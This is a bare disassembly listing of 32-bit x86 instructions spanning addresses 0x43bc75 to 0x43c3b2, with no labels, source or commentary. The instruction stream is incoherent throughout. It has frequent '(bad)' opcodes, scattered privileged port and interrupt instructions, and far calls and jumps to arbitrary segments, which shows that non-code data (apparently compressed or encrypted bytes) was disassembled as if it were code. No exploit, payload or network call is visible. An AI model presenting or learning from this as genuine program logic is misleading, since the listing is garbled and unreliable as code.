  43bc75:	mov    BYTE PTR [ebp+eax*1-0x52ff9edf],cl
  43bc7c:	ins    BYTE PTR es:[edi],dx
  43bc7d:	das    
  43bc7e:	scas   eax,DWORD PTR es:[edi]
  43bc7f:	loope  0x43bc75
  43bc81:	call   0xdae:0x4d1485ee
  43bc88:	pop    ebp
  43bc89:	inc    ebp
  43bc8a:	ror    DWORD PTR [esi-0x1e8580a4],1
  43bc90:	or     DWORD PTR [edx],esi
  43bc92:	mov    ecx,DWORD PTR [edx]
  43bc94:	push   cs
  43bc95:	mov    eax,ds:0x87befae7
  43bc9a:	push   cs
  43bc9b:	(bad)  
  43bc9c:	into   
  43bc9d:	cmp    DWORD PTR [esi+0x11],esp
  43bca0:	inc    esi
  43bca1:	pop    edx
  43bca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bca3:	ret    
  43bca4:	mov    bl,0xc2
  43bca6:	iret   
  43bca7:	mov    cl,0xd7
  43bca9:	mov    esi,0xffd86524
  43bcae:	out    dx,al
  43bcaf:	nop
  43bcb0:	fild   DWORD PTR [esi]
  43bcb2:	pop    ds
  43bcb3:	xchg   ebp,eax
  43bcb4:	or     al,0x85
  43bcb6:	rcr    DWORD PTR [esi+0x3619058],cl
  43bcbc:	dec    DWORD PTR [ecx+0x16]
  43bcbf:	adc    al,0x8e
  43bcc1:	pop    ds
  43bcc2:	inc    edi
  43bcc3:	(bad)  
  43bcc4:	pop    esi
  43bcc5:	jbe    0x43bc8f
  43bcc7:	rcl    BYTE PTR [edi],cl
  43bcc9:	adc    bl,BYTE PTR [esi+0x3659d766]
  43bccf:	jae    0x43bcfc
  43bcd1:	pop    esp
  43bcd2:	in     al,0xf0
  43bcd4:	fist   WORD PTR [edi+0x34]
  43bcd7:	ja     0x43bd34
  43bcd9:	fs stc 
  43bcdb:	xchg   bp,ax
  43bcdd:	add    al,0xae
  43bcdf:	test   DWORD PTR [edi],ebp
  43bce1:	ret    0x689a
  43bce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bce5:	in     al,0xc1
  43bce7:	mov    al,ds:0xb8278e75
  43bcec:	pop    esi
  43bced:	inc    edx
  43bcee:	fwait
  43bcef:	mov    esp,DWORD PTR [ecx-0x5fc0a51d]
  43bcf5:	push   ecx
  43bcf6:	jnp    0x43bcee
  43bcf8:	and    DWORD PTR [edi+0x329fefae],esp
  43bcfe:	ins    BYTE PTR es:[edi],dx
  43bcff:	or     ebx,DWORD PTR [edi-0xc]
  43bd02:	imul   ebx,DWORD PTR [ecx],0x41300ff4
  43bd08:	sbb    eax,0x4bf2a9af
  43bd0d:	popa   
  43bd0e:	in     eax,0xe7
  43bd10:	add    edx,esp
  43bd12:	popf   
  43bd13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bd14:	cmp    cl,BYTE PTR [edx]
  43bd16:	out    dx,al
  43bd17:	push   0xab7d9383
  43bd1c:	push   es
  43bd1d:	jne    0x43bd38
  43bd1f:	mov    gs,esp
  43bd21:	inc    esp
  43bd22:	sbb    al,0xa1
  43bd24:	or     al,0x7e
  43bd26:	out    dx,eax
  43bd27:	push   edi
  43bd28:	cmp    al,0x1b
  43bd2a:	out    dx,al
  43bd2b:	ins    DWORD PTR es:[edi],dx
  43bd2c:	xchg   edx,eax
  43bd2d:	push   esp
  43bd2e:	push   0x8e352bd3
  43bd33:	mov    eax,ds:0xa9af02a6
  43bd38:	ins    DWORD PTR es:[edi],dx
  43bd39:	sti    
  43bd3a:	cmp    bh,ah
  43bd3c:	pop    esi
  43bd3d:	mov    ebp,0x6dd1cd4d
  43bd42:	sub    ch,BYTE PTR [ebx+eax*1+0x19ddb460]
  43bd49:	mov    BYTE PTR [edi-0x386eb3c7],bl
  43bd4f:	call   0x7269:0xd736d15d
  43bd56:	adc    al,0x77
  43bd58:	(bad)  
  43bd59:	sbb    cl,ch
  43bd5b:	jmp    0xea951e04
  43bd60:	jne    0x43bd6a
  43bd62:	xchg   edi,eax
  43bd63:	loop   0x43bdc6
  43bd65:	lock pop edx
  43bd67:	shl    BYTE PTR [esi+0x40],1
  43bd6a:	out    dx,al
  43bd6b:	lock dec ebp
  43bd6d:	mov    BYTE PTR [edx-0x1274bbf3],ah
  43bd73:	icebp  
  43bd74:	iret   
  43bd75:	pusha  
  43bd76:	jl     0x43bde7
  43bd78:	add    ebx,ebx
  43bd7a:	mov    cl,0xf4
  43bd7c:	js     0x43bd35
  43bd7e:	out    dx,al
  43bd7f:	mov    dh,0x5
  43bd81:	ss xchg ecx,eax
  43bd83:	inc    ebx
  43bd84:	dec    BYTE PTR [edi]
  43bd86:	daa    
  43bd87:	mov    ds:0x37cf5896,al
  43bd8c:	pushf  
  43bd8d:	add    DWORD PTR [di-0x279f],0xffffffe7
  43bd93:	push   0xb
  43bd95:	adc    edx,DWORD PTR [ecx]
  43bd97:	ss jnp 0x43bd84
  43bd9a:	outs   dx,BYTE PTR ds:[esi]
  43bd9b:	into   
  43bd9c:	push   eax
  43bd9d:	addr16 inc edi
  43bd9f:	mov    eax,ds:0xae25fbe4
  43bda4:	jo     0x43be15
  43bda6:	ja     0x43bd73
  43bda8:	pop    esi
  43bda9:	enter  0x2395,0x90
  43bdad:	out    dx,eax
  43bdae:	pop    edx
  43bdaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bdb0:	mov    al,ds:0x9abf2751
  43bdb5:	outs   dx,BYTE PTR ds:[esi]
  43bdb6:	scas   al,BYTE PTR es:[edi]
  43bdb7:	pop    edi
  43bdb8:	xor    DWORD PTR [ecx-0xc079e06],ebp
  43bdbe:	out    dx,al
  43bdbf:	mov    bh,0xb8
  43bdc1:	adc    BYTE PTR [edi],bl
  43bdc3:	xor    ebp,DWORD PTR [ebx+0x14]
  43bdc6:	pop    esp
  43bdc7:	mov    eax,ds:0x3170e138
  43bdcc:	inc    esi
  43bdcd:	aas    
  43bdce:	clc    
  43bdcf:	repz push ecx
  43bdd1:	xlat   BYTE PTR ds:[ebx]
  43bdd2:	daa    
  43bdd3:	xchg   si,ax
  43bdd5:	xchg   edx,eax
  43bdd6:	cmp    BYTE PTR [edi+0x2265ec3],0x93
  43bddd:	sub    al,0x19
  43bddf:	jno    0x43bde0
  43bde1:	push   0x7e
  43bde3:	mov    ah,0xb6
  43bde5:	leave  
  43bde6:	fild   DWORD PTR [ebx]
  43bde8:	je     0x43bd83
  43bdea:	out    dx,al
  43bdeb:	sbb    eax,0x6e5634b3
  43bdf0:	ds scas al,BYTE PTR es:[edi]
  43bdf2:	add    eax,0xc0b91a1
  43bdf7:	jmp    0x2c50e32
  43bdfc:	pop    esp
  43bdfd:	int3   
  43bdfe:	jb     0x43be4b
  43be00:	test   DWORD PTR [esi],edi
  43be02:	xchg   ax,ax
  43be04:	int    0xef
  43be06:	mov    ds:0xc31ec561,eax
  43be0b:	and    DWORD PTR [eax+0x319f085b],0xdb3600d6
  43be15:	aam    0xf9
  43be17:	(bad)  
  43be18:	mov    esi,0xb36f38ca
  43be1d:	pusha  
  43be1e:	jecxz  0x43be84
  43be20:	or     BYTE PTR [ebx],dl
  43be22:	jne    0x43be4b
  43be24:	mov    ds:0x7bccee6e,al
  43be29:	stc    
  43be2a:	cwde   
  43be2b:	mov    dh,0x79
  43be2d:	xor    eax,0xce429f0f
  43be32:	xor    edx,DWORD PTR [edx]
  43be34:	jnp    0x43be06
  43be36:	mov    al,ds:0xb839dfbc
  43be3b:	pop    edi
  43be3c:	outs   dx,BYTE PTR ds:[esi]
  43be3d:	add    edi,DWORD PTR [ebx+ebp*4+0x74]
  43be41:	and    ch,dh
  43be43:	stos   DWORD PTR es:[edi],eax
  43be44:	mov    eax,ds:0x86f5403c
  43be49:	add    eax,0x5de9838d
  43be4e:	sbb    ebx,DWORD PTR [esi]
  43be50:	mov    dh,0x5c
  43be52:	sahf   
  43be53:	das    
  43be54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43be55:	cdq    
  43be56:	outs   dx,BYTE PTR ds:[esi]
  43be57:	adc    al,0x5e
  43be59:	mov    dl,BYTE PTR [edi-0x627d999f]
  43be5f:	xchg   ebx,eax
  43be60:	add    ch,BYTE PTR [ebx]
  43be62:	adc    BYTE PTR [ecx+0x106624a7],ah
  43be68:	jg     0x43bdf7
  43be6a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  43be6c:	pop    esi
  43be6d:	ins    DWORD PTR es:[edi],dx
  43be6e:	stc    
  43be6f:	lahf   
  43be70:	(bad)  
  43be71:	aad    0x21
  43be73:	cmp    ch,BYTE PTR [eax+0x17f81060]
  43be79:	pushf  
  43be7a:	rol    BYTE PTR [ebx],0x6a
  43be7d:	stos   BYTE PTR es:[edi],al
  43be7e:	out    dx,al
  43be7f:	sub    ecx,0x7e123c9f
  43be85:	ds sti 
  43be87:	mov    al,ds:0x5c8ccef1
  43be8c:	sbb    al,0x42
  43be8e:	adc    DWORD PTR [edx+edx*2-0x17],ecx
  43be92:	aas    
  43be93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43be94:	pop    edi
  43be95:	dec    edi
  43be96:	push   esp
  43be97:	lock cdq 
  43be99:	test   al,0x2c
  43be9b:	sub    dl,BYTE PTR [eax+eiz*2-0x268913e8]
  43bea2:	(bad)  
  43bea3:	push   ecx
  43bea4:	mov    ebp,0x387ceed1
  43bea9:	leave  
  43beaa:	xor    BYTE PTR [esi+0x13],bh
  43bead:	xchg   ebp,eax
  43beae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43beaf:	mov    al,ds:0x6710a769
  43beb4:	add    BYTE PTR [eax+0x33],bh
  43beb7:	stos   BYTE PTR es:[edi],al
  43beb8:	pop    esi
  43beb9:	push   esi
  43beba:	cmc    
  43bebb:	lahf   
  43bebc:	push   edi
  43bebd:	or     BYTE PTR [eiz*2+0x7bbe606d],dl
  43bec4:	cdq    
  43bec5:	test   eax,0x7b242ae3
  43beca:	out    dx,al
  43becb:	lods   al,BYTE PTR ds:[esi]
  43becc:	(bad)  
  43becd:	loop   0x43be9a
  43becf:	sbb    eax,DWORD PTR [edi+0x5f]
  43bed2:	jmp    0x8b30e477
  43bed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bed8:	and    bh,BYTE PTR [ebx]
  43beda:	outs   dx,DWORD PTR ds:[esi]
  43bedb:	lahf   
  43bedc:	cmp    ah,BYTE PTR [ebx-0x80]
  43bedf:	repnz push ebx
  43bee1:	(bad)  
  43bee2:	out    dx,al
  43bee3:	stc    
  43bee4:	aas    
  43bee5:	outs   dx,DWORD PTR ds:[esi]
  43bee6:	ficom  WORD PTR [edi+ecx*1-0x2bcb989c]
  43beed:	pop    esp
  43beee:	sbb    esp,DWORD PTR [ecx+0x40]
  43bef1:	sar    BYTE PTR [edi+edi*1-0x3b],0x29
  43bef6:	in     eax,dx
  43bef7:	repz dec ecx
  43bef9:	fstp   TBYTE PTR [esi]
  43befb:	add    ch,dh
  43befd:	jl     0x43bedd
  43beff:	pushf  
  43bf00:	push   ecx
  43bf01:	pop    edx
  43bf02:	mov    dl,0xcf
  43bf04:	rcr    esp,0x6
  43bf07:	das    
  43bf08:	sahf   
  43bf09:	fisubr WORD PTR [edi-0x27]
  43bf0c:	mov    edx,0xefa301e7
  43bf11:	mov    al,0xae
  43bf13:	(bad)  
  43bf14:	(bad)  
  43bf15:	dec    ecx
  43bf16:	push   edi
  43bf17:	sti    
  43bf18:	loop   0x43bf7a
  43bf1a:	iret   
  43bf1b:	jmp    0x43bf1e
  43bf1d:	sbb    BYTE PTR [ebp+0x4a7d8e28],0xb
  43bf24:	pop    esi
  43bf25:	mov    bh,0xb6
  43bf27:	and    dl,BYTE PTR [ebp+0x2a3c83f9]
  43bf2d:	popa   
  43bf2e:	fisubr WORD PTR [edx+0x3b]
  43bf31:	inc    esp
  43bf32:	stos   BYTE PTR es:[edi],al
  43bf33:	xchg   ebx,eax
  43bf34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bf35:	jb     0x43bf25
  43bf37:	rcr    DWORD PTR [ecx+0x79],cl
  43bf3a:	sbb    al,0x90
  43bf3c:	push   es
  43bf3d:	jnp    0x43bfbe
  43bf3f:	mov    eax,ds:0x9a96a3b3
  43bf44:	ror    DWORD PTR es:[eax-0xea29b02],1
  43bf4b:	pop    ebx
  43bf4c:	adc    eax,DWORD PTR [ecx]
  43bf4e:	push   0xffffffd2
  43bf50:	sti    
  43bf51:	jmp    0x43bf17
  43bf53:	mov    al,ds:0xc993ca5d
  43bf58:	ins    BYTE PTR es:[edi],dx
  43bf59:	sub    eax,0x193547f7
  43bf5e:	aad    0x20
  43bf60:	rol    BYTE PTR [edx+0x71],0x83
  43bf64:	inc    eax
  43bf65:	outs   dx,BYTE PTR ds:[esi]
  43bf66:	jmp    0x43bf08
  43bf68:	or     al,0xe1
  43bf6a:	fidiv  DWORD PTR [edx]
  43bf6c:	int3   
  43bf6d:	jp     0x43bf28
  43bf6f:	fisub  WORD PTR [esp+edi*4+0x72]
  43bf73:	push   ss
  43bf74:	push   esi
  43bf75:	sbb    DWORD PTR [edx+edx*2+0x57],0xa1a0a751
  43bf7d:	push   esp
  43bf7e:	jg     0x43bfd8
  43bf80:	les    ebp,FWORD PTR [ebp-0x2cc88d99]
  43bf86:	test   BYTE PTR [ecx+0x211a62b4],ch
  43bf8c:	fidiv  WORD PTR [ebx+0x31]
  43bf8f:	shl    bh,1
  43bf91:	std    
  43bf92:	cmp    al,0xf0
  43bf94:	jns    0x43bff9
  43bf96:	enter  0xd361,0x1a
  43bf9a:	adc    al,0x24
  43bf9c:	inc    eax
  43bf9d:	pop    ebx
  43bf9e:	js     0x43bf80
  43bfa0:	xchg   BYTE PTR ds:0x4fed2c4a,ah
  43bfa6:	out    dx,al
  43bfa7:	jmp    0x52160761
  43bfac:	fst    QWORD PTR ds:0x9620947e
  43bfb2:	xor    DWORD PTR [edi+esi*8+0x5e8775f6],esp
  43bfb9:	sbb    ebx,DWORD PTR ds:0xfd7f9e20
  43bfbf:	sub    ch,BYTE PTR [edi+0x5ebbf908]
  43bfc5:	mov    edi,0xc2e26b6e
  43bfca:	mov    bh,0xdc
  43bfcc:	pop    esi
  43bfcd:	xlat   BYTE PTR ds:[ebx]
  43bfce:	pushf  
  43bfcf:	push   0x2e309d2e
  43bfd4:	push   esp
  43bfd5:	daa    
  43bfd6:	and    DWORD PTR [ecx-0x1ceed372],0xcb681792
  43bfe0:	mov    BYTE PTR [ebx],dl
  43bfe2:	in     eax,dx
  43bfe3:	mov    ch,0xb
  43bfe5:	xchg   ebx,eax
  43bfe6:	pop    ecx
  43bfe7:	adc    DWORD PTR [edx+0xf],ecx
  43bfea:	xor    bh,BYTE PTR [esi]
  43bfec:	cli    
  43bfed:	pusha  
  43bfee:	in     al,dx
  43bfef:	nop
  43bff0:	imul   ebx,DWORD PTR [eax-0x72c313f4],0x1f
  43bff7:	ss jmp 0xb46ff05c
  43bffd:	mov    ah,0x93
  43bfff:	dec    ecx
  43c000:	ficom  WORD PTR [esi+0x19]
  43c003:	arpl   dx,si
  43c005:	mov    esi,0x995dd20e
  43c00a:	sub    BYTE PTR [esi+0x40],ah
  43c00d:	repz lea edi,[ebx+0x658922de]
  43c014:	mov    edi,DWORD PTR [edi-0x13a1f283]
  43c01a:	stos   DWORD PTR es:[edi],eax
  43c01b:	mov    al,0xa
  43c01d:	xor    bh,BYTE PTR [edi-0x4ebf64c5]
  43c023:	mov    edx,0x4b53a3cb
  43c028:	arpl   bx,bp
  43c02a:	fs lock mov dh,0x20
  43c02e:	mov    al,0xca
  43c030:	mov    edx,0xf0a18b78
  43c035:	je     0x43c021
  43c037:	test   eax,0x8bff7e08
  43c03c:	and    dh,BYTE PTR [edx+0x31]
  43c03f:	mov    ds:0x756a4b17,al
  43c044:	push   esi
  43c045:	fist   WORD PTR [edx+0x6]
  43c048:	sub    eax,0x52050c61
  43c04d:	mov    cl,0x5f
  43c04f:	push   ecx
  43c050:	jno    0x43c040
  43c052:	pop    edx
  43c053:	fcomp  DWORD PTR [esi-0x66]
  43c056:	js     0x43c033
  43c058:	sbb    BYTE PTR [edi],dh
  43c05a:	mov    dh,al
  43c05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c05d:	cs ret 
  43c05f:	mov    al,ds:0x70fae3b8
  43c064:	test   edi,0x855f31d5
  43c06a:	fisttp QWORD PTR [esi]
  43c06c:	and    BYTE PTR [edx+0x546f48c2],ah
  43c072:	(bad)  
  43c073:	jb     0x43c02c
  43c075:	pop    edi
  43c076:	mov    ch,0xd2
  43c078:	mov    al,0xa3
  43c07a:	aas    
  43c07b:	stos   BYTE PTR es:[edi],al
  43c07c:	mov    dh,0x9c
  43c07e:	cs pop edi
  43c080:	pop    esi
  43c081:	imul   edx,esp,0xffffff94
  43c084:	stc    
  43c085:	xchg   esi,eax
  43c086:	sub    BYTE PTR [ebp+ebp*4+0x60],al
  43c08a:	push   cs
  43c08b:	imul   ecx,ebp,0x8eeb5ba4
  43c091:	xchg   edi,eax
  43c092:	and    al,0xd6
  43c094:	add    al,0x61
  43c096:	les    edx,FWORD PTR [ecx-0x38274e5f]
  43c09c:	gs popa 
  43c09e:	fld    TBYTE PTR [ecx+0x25]
  43c0a1:	push   ebp
  43c0a2:	or     BYTE PTR [ebp-0x27],cl
  43c0a5:	and    DWORD PTR [eax],eax
  43c0a7:	out    0xc1,eax
  43c0a9:	add    ebp,DWORD PTR [edx]
  43c0ab:	jmp    0x43c0a6
  43c0ad:	data16 adc BYTE PTR cs:[esi],bl
  43c0b1:	out    dx,eax
  43c0b2:	dec    esi
  43c0b3:	mov    eax,ds:0x1e2374ac
  43c0b8:	(bad)  
  43c0b9:	test   al,0xa7
  43c0bb:	cld    
  43c0bc:	push   edx
  43c0bd:	inc    esi
  43c0be:	xchg   BYTE PTR [ecx+0x5e],dh
  43c0c1:	xor    al,BYTE PTR [ebx+eiz*4-0x5eb04164]
  43c0c8:	arpl   WORD PTR [edi+0x26dc240e],bp
  43c0ce:	add    dh,cl
  43c0d0:	xor    DWORD PTR [edi],edi
  43c0d2:	ins    DWORD PTR es:[edi],dx
  43c0d3:	mov    eax,ds:0xa99bdc29
  43c0d8:	test   BYTE PTR [ecx],bl
  43c0da:	pusha  
  43c0db:	stos   BYTE PTR es:[edi],al
  43c0dc:	pop    es
  43c0dd:	push   edi
  43c0de:	push   0xffffffe9
  43c0e0:	loop   0x43c0d8
  43c0e2:	jmp    0xde62:0xaae0e021
  43c0e9:	sar    BYTE PTR [eax],cl
  43c0eb:	jb     0x43c16b
  43c0ed:	and    al,0xae
  43c0f0:	pop    esi
  43c0f1:	mov    bl,BYTE PTR [eax]
  43c0f3:	ja     0x43c159
  43c0f5:	sar    dl,cl
  43c0f7:	mov    esp,0xe46c6146
  43c0fc:	xchg   ebp,eax
  43c0fd:	jmp    0x3ef0:0x18525ad0
  43c104:	or     dl,0x7d
  43c107:	add    ch,BYTE PTR [eax]
  43c109:	scas   al,BYTE PTR es:[edi]
  43c10a:	or     dh,al
  43c10c:	jp     0x43c0b7
  43c10e:	adc    BYTE PTR [ebx+edx*1+0x5e10d291],bl
  43c115:	pop    ebp
  43c116:	inc    edi
  43c117:	jne    0x43c11c
  43c119:	and    eax,0xe0850321
  43c11e:	call   0xe854:0xf2d9fcf
  43c125:	push   0xfde4373
  43c12a:	jmp    0x86170ac2
  43c12f:	or     ebx,DWORD PTR [esi+0x74]
  43c132:	or     bh,BYTE PTR [ecx+0x44]
  43c135:	inc    esi
  43c136:	push   0xffffffbd
  43c138:	cmp    esp,DWORD PTR [ecx-0x1a]
  43c13b:	jge    0x43c0d0
  43c13d:	jbe    0x43c10d
  43c13f:	loopne 0x43c194
  43c141:	and    bh,ah
  43c143:	jno    0x43c18f
  43c145:	loope  0x43c179
  43c147:	leave  
  43c148:	cs jnp 0x43c12d
  43c14b:	cmp    ebp,DWORD PTR [ecx]
  43c14d:	popa   
  43c14e:	or     DWORD PTR [edx+0x7c],0x4
  43c152:	fwait
  43c153:	mov    ebp,0x59eec426
  43c158:	(bad)  [ebx+0x190ef49]
  43c15e:	jo     0x43c139
  43c160:	out    0xe6,eax
  43c162:	out    dx,al
  43c163:	push   esi
  43c164:	inc    ebx
  43c165:	aaa    
  43c166:	ins    DWORD PTR es:[edi],dx
  43c167:	pop    esi
  43c168:	jmp    0x43c10b
  43c16a:	out    dx,al
  43c16b:	sub    BYTE PTR [ebx+0xf],bh
  43c16e:	push   esp
  43c16f:	aam    0x51
  43c171:	inc    DWORD PTR [edx+eiz*4]
  43c174:	iret   
  43c175:	ret    0x9d2f
  43c178:	ror    BYTE PTR fs:[ebp-0x11eed09f],1
  43c17f:	retf   
  43c180:	adc    al,0xba
  43c182:	daa    
  43c183:	hlt    
  43c184:	sub    BYTE PTR [edi-0x7a5c409c],0xf1
  43c18b:	mov    al,ds:0x6a1bc6f7
  43c190:	pushf  
  43c191:	mov    dl,0xee
  43c193:	cdq    
  43c194:	inc    ebx
  43c195:	icebp  
  43c196:	inc    edx
  43c197:	cwde   
  43c198:	sbb    DWORD PTR [edx],0xe
  43c19b:	mov    eax,ds:0xbed83b23
  43c1a0:	sbb    BYTE PTR [esp+ecx*1+0x49],bh
  43c1a4:	pop    esi
  43c1a5:	mov    ch,BYTE PTR [esi+0x1]
  43c1a8:	ins    DWORD PTR es:[edi],dx
  43c1a9:	sub    BYTE PTR [esi+0x79],bl
  43c1ac:	jo     0x43c20e
  43c1ae:	pop    es
  43c1af:	fstp   QWORD PTR [eax+0x42]
  43c1b2:	ret    0xbeb0
  43c1b5:	mov    edi,0x3e8144ee
  43c1ba:	inc    esi
  43c1bb:	imul   edx,esp,0x5b
  43c1be:	lods   al,BYTE PTR ds:[esi]
  43c1bf:	add    cl,bl
  43c1c1:	test   BYTE PTR [ebp-0x135a6b52],bh
  43c1c7:	mov    ds:0xe4089cce,eax
  43c1cc:	(bad)  
  43c1cd:	and    DWORD PTR [esi-0x19],ecx
  43c1d0:	repnz aam 0xf0
  43c1d3:	push   0x2b
  43c1d5:	cld    
  43c1d6:	dec    ecx
  43c1d7:	and    ebp,esp
  43c1d9:	dec    ecx
  43c1da:	push   ebx
  43c1db:	pop    edx
  43c1dc:	stos   BYTE PTR es:[edi],al
  43c1dd:	inc    ebx
  43c1de:	inc    esi
  43c1df:	push   0xfd739e3f
  43c1e4:	xchg   edi,eax
  43c1e5:	cmp    DWORD PTR [esi-0x1468b0fe],ecx
  43c1eb:	lods   al,BYTE PTR ds:[esi]
  43c1ec:	xor    eax,0x2a448770
  43c1f1:	mov    cl,0x68
  43c1f3:	dec    ebx
  43c1f4:	lods   eax,DWORD PTR ds:[esi]
  43c1f5:	pusha  
  43c1f6:	cdq    
  43c1f7:	and    eax,0x4523d088
  43c1fc:	shr    dh,1
  43c1fe:	dec    edx
  43c1ff:	js     0x43c260
  43c201:	mov    bl,0x60
  43c203:	(bad)  
  43c205:	dec    bl
  43c207:	xor    BYTE PTR [ebp+edi*4-0x58],bl
  43c20b:	lods   al,BYTE PTR ds:[esi]
  43c20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c20d:	and    eax,0x7caaac5e
  43c212:	sub    BYTE PTR ds:0x5afddfb6,0x92
  43c219:	nop
  43c21a:	(bad)  
  43c21b:	fs inc ebx
  43c21d:	cdq    
  43c21e:	out    dx,al
  43c21f:	sbb    al,0x37
  43c221:	inc    ecx
  43c222:	xchg   esi,eax
  43c223:	mov    esp,0xf5c37022
  43c228:	push   0x60
  43c22a:	add    ebp,DWORD PTR [ecx-0x71d21671]
  43c230:	sti    
  43c231:	dec    esp
  43c232:	out    dx,al
  43c233:	cmp    eax,0x2dd5ec58
  43c238:	fdivp  st(5),st
  43c23a:	scas   eax,DWORD PTR es:[edi]
  43c23b:	mov    ecx,ebp
  43c23d:	push   cs
  43c23e:	(bad)
  43c241:	mov    ebp,0xde5b0ba3
  43c246:	sbb    al,cl
  43c248:	adc    BYTE PTR [ebx-0x4f6deea2],0x73
  43c24f:	mov    eax,ds:0xd4dd183c
  43c254:	xchg   ebp,eax
  43c255:	mov    ebx,0xfc5e51e1
  43c25a:	in     al,0x69
  43c25c:	ret    
  43c25d:	sub    ch,dl
  43c25f:	sbb    DWORD PTR [eax],esi
  43c261:	popa   
  43c262:	push   ecx
  43c263:	fucomip st,st(0)
  43c265:	cmp    ebp,DWORD PTR [eax]
  43c267:	jbe    0x43c1f3
  43c269:	in     eax,dx
  43c26a:	out    dx,al
  43c26b:	je     0x43c2e9
  43c26d:	daa    
  43c26e:	imul   edi,DWORD PTR [edi],0xa0e917f8
  43c274:	fwait
  43c275:	jns    0x43c28c
  43c277:	ret    0xbf52
  43c27a:	mov    ebp,DWORD PTR [eax+eiz*2-0x15]
  43c27e:	jb     0x43c224
  43c280:	fmul   QWORD PTR [esp+eax*2]
  43c283:	add    DWORD PTR [eax],eax
  43c285:	jl     0x43c234
  43c287:	mov    al,ds:0xf8f5dd02
  43c28c:	jl     0x43c2ed
  43c28e:	(bad)  
  43c28f:	pop    eax
  43c290:	pop    esi
  43c291:	jp     0x43c27a
  43c293:	inc    eax
  43c294:	ja     0x43c29e
  43c296:	iret   
  43c297:	xchg   edx,eax
  43c298:	inc    esi
  43c299:	pop    edx
  43c29a:	xchg   ecx,eax
  43c29b:	popf   
  43c29c:	or     dl,BYTE PTR [edx-0x66]
  43c29f:	mov    eax,0xb253306d
  43c2a4:	add    edi,0x48
  43c2a7:	sub    al,0x68
  43c2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c2aa:	sahf   
  43c2ab:	inc    edi
  43c2ac:	cmp    ecx,esi
  43c2ae:	out    dx,al
  43c2af:	loop   0x43c30b
  43c2b1:	xor    bh,BYTE PTR [ebx+ebx*8]
  43c2b4:	mov    bl,0x60
  43c2b6:	(bad)  
  43c2b7:	push   edi
  43c2b8:	push   esp
  43c2b9:	adc    eax,0xa937f35f
  43c2be:	lock sbb al,0x6e
  43c2c1:	js     0x43c279
  43c2c3:	add    edi,edi
  43c2c5:	leave  
  43c2c6:	mov    ds:0x622dfe21,al
  43c2cb:	call   0x8bdd:0x9badb68b
  43c2d2:	jbe    0x43c32d
  43c2d4:	cmp    eax,0x5eb4be8d
  43c2d9:	jbe    0x43c357
  43c2db:	sub    BYTE PTR [ebx],0x35
  43c2de:	xor    eax,0x5008d34a
  43c2e3:	iret   
  43c2e4:	push   esp
  43c2e5:	lods   al,BYTE PTR ds:[esi]
  43c2e6:	retf   0xd921
  43c2e9:	je     0x43c346
  43c2eb:	fcomp  DWORD PTR [edx-0x77]
  43c2ee:	sbb    eax,0xee86eed6
  43c2f3:	xor    BYTE PTR [eax],ah
  43c2f5:	cmp    bl,BYTE PTR [ebx]
  43c2f7:	test   BYTE PTR [ebp+0x7b],al
  43c2fa:	push   cs
  43c2fb:	mov    eax,ds:0x9fb79a9b
  43c300:	cmp    eax,DWORD PTR [ebp+0x5c5e5253]
  43c306:	cli    
  43c307:	fisub  DWORD PTR [edi+0x318dcd11]
  43c30d:	popa   
  43c30e:	fild   DWORD PTR [ebp-0x6a43b14d]
  43c314:	inc    edi
  43c315:	mov    ch,dh
  43c317:	out    0x2e,eax
  43c319:	je     0x43c36e
  43c31b:	mov    esi,DWORD PTR [esi]
  43c31d:	xor    edi,DWORD PTR [esi-0x5f]
  43c320:	push   ecx
  43c321:	dec    esi
  43c322:	ja     0x43c2e7
  43c324:	xor    bh,bl
  43c326:	add    BYTE PTR [esi+0x5a],cl
  43c329:	xchg   esp,eax
  43c32a:	in     al,dx
  43c32b:	mov    bl,0xf6
  43c32d:	sbb    DWORD PTR [esi-0x1b],ebp
  43c330:	or     BYTE PTR [esi+0x7b],bl
  43c333:	test   al,0x9c
  43c335:	mov    ds:0x715b1156,al
  43c33a:	in     eax,dx
  43c33b:	xor    DWORD PTR [ebp-0x134711f8],ebx
  43c341:	xor    al,0x20
  43c343:	xor    eax,0xa12fdf8c
  43c348:	xchg   ecx,eax
  43c349:	push   ecx
  43c34a:	shl    ecx,cl
  43c34c:	pusha  
  43c34d:	loope  0x43c32b
  43c34f:	clc    
  43c350:	pop    esi
  43c351:	out    0x6a,eax
  43c353:	inc    esp
  43c354:	cmp    bh,BYTE PTR [esp+edi*1]
  43c357:	enter  0x612f,0x61
  43c35b:	stos   BYTE PTR es:[edi],al
  43c35c:	adc    eax,0x47322bfb
  43c361:	rcr    BYTE PTR [edi],0x81
  43c364:	pop    esp
  43c365:	loope  0x43c352
  43c367:	rol    BYTE PTR [eiz*2+0x60b058d1],0x9e
  43c36f:	inc    edx
  43c370:	push   esi
  43c371:	push   es
  43c372:	repnz fnstenv [esi-0x622811ed]
  43c379:	cmp    DWORD PTR [edi+0x578753ec],eax
  43c37f:	mov    eax,ds:0xb3ef946a
  43c384:	sub    cl,bl
  43c386:	sar    DWORD PTR [edx],0x5e
  43c389:	mov    ?,ecx
  43c38b:	or     bh,BYTE PTR [esi+0x1b]
  43c38e:	push   esp
  43c38f:	ja     0x43c3eb
  43c391:	popa   
  43c392:	enter  0xdc77,0xc9
  43c396:	jg     0x43c356
  43c398:	rcr    DWORD PTR [eax+0x6cc27fee],0x7e
  43c39f:	sbb    DWORD PTR [edi+ebx*4],esi
  43c3a2:	and    esi,DWORD PTR [ebx-0x5b]
  43c3a5:	pusha  
  43c3a6:	push   edx
  43c3a7:	bound  esp,QWORD PTR [ebx-0x70002a1c]
  43c3ad:	and    al,0x23
  43c3af:	dec    ecx
  43c3b0:	sbb    ah,cl
  43c3b2:	scas   eax,DWORD PTR es:[edi]
